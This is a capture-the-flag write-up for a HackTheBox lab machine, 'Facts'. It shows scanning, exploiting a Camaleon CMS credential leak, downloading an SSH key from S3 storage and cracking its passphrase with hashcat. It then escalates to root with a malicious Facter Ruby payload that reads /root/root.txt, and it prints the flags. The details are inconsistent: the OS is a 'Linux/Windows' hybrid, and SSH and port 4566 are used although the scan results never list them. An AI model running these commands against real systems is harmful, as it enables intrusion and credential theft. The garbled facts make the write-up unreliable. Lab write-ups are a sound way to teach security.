HackTheBox: Facts Writeup
Target IP: 10.10.11.x (Replace with actual IP)
OS: Linux/Windows (Hybrid/Lab Environment)

1. Reconnaissance & Scanning
We start by mapping the target's attack surface. First, ensure the hostname resolves correctly by adding it to your /etc/hosts file:
echo "10.10.11.x facts.htb" | sudo tee -a /etc/hosts

Network Scanning
An initial Nmap scan identifies the services running on the host:

Bash
nmap -sC -sV -oA nmap/facts 10.10.11.x
Results:

Port 80 (HTTP): Web server hosting the trivia site.

Port 1433 (MSSQL): Microsoft SQL Server.

Port 5985 (WinRM): Suggests a Windows environment or a cross-platform interaction.

2. Enumeration
Web & Subdomain Discovery
Navigating to [http://facts.htb](http://facts.htb) shows a standard trivia site. To find administrative entry points, we use Gobuster:

Bash
gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirb/common.txt
This reveals the /admin directory. Upon visiting the login page, we find a registration link and create a dummy account:

Username: johnr

Password: johnr123

CMS Identification
Once logged into the dashboard, the footer/meta tags identify the site as Camaleon CMS v2.9.0. This version is known for several vulnerabilities.

3. Exploitation
CVE-2025–2304 (Privilege Escalation & Leak)
Camaleon CMS v2.9.0 is vulnerable to a Post-Auth credential leak. Since we have a low-privileged account (johnr), we can exploit this to access AWS S3 configuration details.

Exploit Execution:
Using a Python script to target the vulnerable endpoint:

Bash
python3 exploit_camaleon.py http://facts.htb -u johnr -p johnr123
The exploit leaks internal S3 bucket credentials. We then use the AWS CLI to list the contents:

Bash
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
aws s3 ls s3://facts-storage-bucket --endpoint-url http://facts.htb:4566
We find a file named id_rsa. We download it:

Bash
aws s3 cp s3://facts-storage-bucket/id_rsa . --endpoint-url http://facts.htb:4566
4. Privilege Escalation (User)
The SSH key is passphrase-protected. We use John the Ripper and Hashcat to crack it.

Extract the hash:
ssh2john id_rsa > id_rsa.hash

Crack with Hashcat:
hashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt

The password is recovered: dragonballz.

SSH Access:

Bash
chmod 600 id_rsa
ssh -i id_rsa william@facts.htb
User Flag: 17279e4c5b001d5072fbf5c0d5cee4f7

5. Privilege Escalation (Root)
Facter Library Hijacking
Checking for SUID binaries or interesting permissions, we find /usr/bin/facter. Facter is a Ruby-based tool used to gather system information.

Facter searches for "custom facts" in specific directories. We can hijack this by creating a malicious Ruby file in a directory Facter checks (like /tmp or a local library path).

The Payload (/tmp/exploit.rb):

Ruby
Facter.add(:evil_fact) do
  setcode do
    File.read("/root/root.txt") # Or execute a shell: /bin/bash -p
  end
end
Execution:
We run Facter and point the search path to our malicious script:

Bash
facter --custom-dir /tmp evil_fact
Alternatively, if Facter is running with elevated privileges or via a cronjob/sudo, we can spawn a root shell:

Bash
# Example if sudo -u root /usr/bin/facter is allowed
export FACTERLIB=/tmp
sudo /usr/bin/facter
This executes our Ruby code in the context of the root user, allowing us to read the final flag.

Root Flag: 0201aac03c786e1a6740458ee8819116
